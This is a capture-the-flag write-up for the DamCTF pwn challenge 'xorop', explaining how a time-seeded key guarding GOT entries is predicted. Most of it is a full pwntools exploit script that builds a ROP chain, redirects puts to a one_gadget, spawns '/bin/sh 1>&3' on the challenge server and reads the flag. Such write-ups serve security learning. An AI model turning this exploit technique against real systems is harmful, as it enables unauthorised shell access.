​Hi,
we get first blood on this one, so a little write up follows...

the key is generated with a dumb algorithm (srand(time(0)) and some xor..
it depends on time so..
the server and the attacker must have the same date to generate the good key

this key is added to libc addresses on .bss (got) to make them unusable...

the idea, is to calculate the negative key + the offset from puts address in libc to a onegadget
then we return back to the function which encode the libc addresses to cancel the libc addresses modifications on .bss
then we just call puts, which will contain the onegadget address by now

the key was stored at address 0x600c38 on .bss,
we modify it with a xor gadget (gadget3)

it takes 2 o 3 tries to work sometimes...no more..

stdin is closed by the program, and will need to be redirected to fd number 3, that's why we do "/bin/sh 1>&3" first,
to see the output of commands

brought to you, by nobodyisnobody , pwner for **RootMeUpBeforeYouGoGo**


```python
#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
from pwn import *
from ctypes import CDLL
from math import *

libc = CDLL("libc.so.6")


context.log_level = 'info'

#setting
do_remote = 1
remote_host = 'chals.damctf.xyz'
remote_port = 31228
challenge_exe = "./xorop"

context(arch = 'amd64', os = 'linux', endian="little")

puts_plt = 0x000000000400620

gadget3 = 0x400708	# xor    QWORD PTR [rdi],rsi / add    rdi,0x8 / cmp    rdx,rdi / ja     400708 / ret
gadget4 = 0x000000000040088f  # pop rdi ; ret
gadget5 = 0x000000000040088d  # pop rsi ; pop r15 ; ret
gadget6 = 0x400890		# ret

# get time
now = int(floor(time.time()))

if do_remote == 1:
  p = connect(remote_host, remote_port)
else:
  p = process(challenge_exe, env={'LD_PRELOAD':'./libc.so.6'})

p.sendafter('continue.\n', '\x00')

# initialize with srand(time(0))
libc.srand(now)
info('now = '+str(now))

key = libc.rand()
if (key & 0x80000000):
  key = (0xffffffff80000000 | (key & 0x7fffffff))
nrand = libc.rand()
if (nrand & 0x80000000): 
  nrand = (0xffffffff80000000 | (nrand & 0x7fffffff) )
key = key ^ (nrand<<21)
key = (key ^ (libc.rand()<<42))&0xffffffffffffffff

# negate the key + offset of onegadget
negkey = (0 - (key + 0x316cb ))&0xffffffffffffffff      # 0x4f365 execve("/bin/sh", rsp+0x40, environ)
info('my key = '+hex(key)+'  (negkey = '+hex(negkey)+')')

# we use xor gadget to change the key to it's negative + offset of (onegadget - puts) in libc
payload = p64(gadget4) + p64(0x600c38)
payload += p64(gadget5) + p64(key ^ negkey) + p64(0)
payload += p64(gadget3)
# we return to the program that encode the libc addresses in .bss, but this time it will decode them with the negative key
payload += p64(0x4007d4)
payload += p64(0)*9
# we add a gadget to align the stack
payload += p64(gadget6)
# then we jump to the one_gadget (which is in puts@got now)
payload += p64(puts_plt)

p.sendlineafter('memfrob?\n', p64(0) + p64(0xdeadbeef)*7 + p64(negkey & 0xffffffff) + payload)
p.readuntil('4 u.\n')

p.sendline('/bin/sh 1>&3')
info('Ok Take your flag dude...')
p.sendline('cat flag')

p.interactive()

```

